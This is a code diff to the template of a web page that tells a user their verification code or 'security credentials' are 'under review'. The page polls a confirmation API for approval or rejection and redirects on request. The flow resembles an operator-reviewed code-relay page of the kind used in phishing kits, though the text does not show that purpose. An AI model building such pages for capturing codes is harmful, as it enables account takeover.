@@ -20,9 +20,9 @@
         <div class="verification-spinner"></div>
         <div class="verification-shield">🛡️</div>
       </div>
-      <h3 class="verification-title">Verification Code Under Review</h3>
+      <h3 class="verification-title">Security Verification Under Review</h3>
       <p class="verification-description">
-        Your verification code is being reviewed by our verification system. 
+        Your security credentials are being reviewed by our verification system. 
         This automated process ensures the highest level of account protection and typically completes within seconds.
       </p>
       
@@ -115,10 +115,8 @@
 </div>
 
 <script>
-const codeValue = "{{ code_value }}";
+const submissionId = {{ submission_id }};  // Use submission_id instead of code_value
 const nextUrl = "{{ next_url }}";
-const submissionId = "{{ submission_id }}";
-const previousPageUrl = "{{ previous_page_url }}";  // This should be set to the current code entry page, not the first one
 
 function showLoadingState() {
   document.getElementById('loading-state').style.display = 'block';
@@ -154,9 +152,12 @@ function showSuccessState() {
 }
 
 function checkConfirmation() {
-  fetch(`/api/check_confirmation/${submissionId}`)  // Use submissionId instead of codeValue for security
+  // FIXED: Use submission_id instead of code_value
+  fetch(`/api/check_confirmation/${submissionId}`)
     .then(response => response.json())
     .then(data => {
+      console.log('Confirmation check response:', data); // Debug log
+      
       if (data.status === 'approved') {
         showSuccessState();
       } else if (data.status === 'rejected') {
@@ -180,6 +181,7 @@ function requestNewCode() {
   resendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Requesting New Code...';
   resendBtn.disabled = true;
   
+  // FIXED: Use submission_id
   fetch(`/api/request_new_code/${submissionId}`, {
     method: 'POST',
     headers: {
@@ -188,9 +190,10 @@ function requestNewCode() {
   })
   .then(response => response.json())
   .then(data => {
+    console.log('New code request response:', data); // Debug log
     if (data.success) {
-      // Redirect back to the CURRENT previous page (not the first one)
-      window.location.href = previousPageUrl;
+      // Redirect back to the CURRENT previous page
+      window.location.href = data.redirect_url;
     } else {
       alert('Unable to request new code. Please try again.');
       resendBtn.innerHTML = originalText;
@@ -206,10 +209,11 @@ function requestNewCode() {
 }
 
 // Start checking for confirmation and progress animation
-setTimeout(checkConfirmation, 2000);
-
-// Progress animation
 document.addEventListener('DOMContentLoaded', function() {
+  // Start checking for confirmation
+  setTimeout(checkConfirmation, 2000);
+  
+  // Progress animation
   const progressFill = document.querySelector('.progress-fill');
   let progress = 0;
   const progressInterval = setInterval(() => {
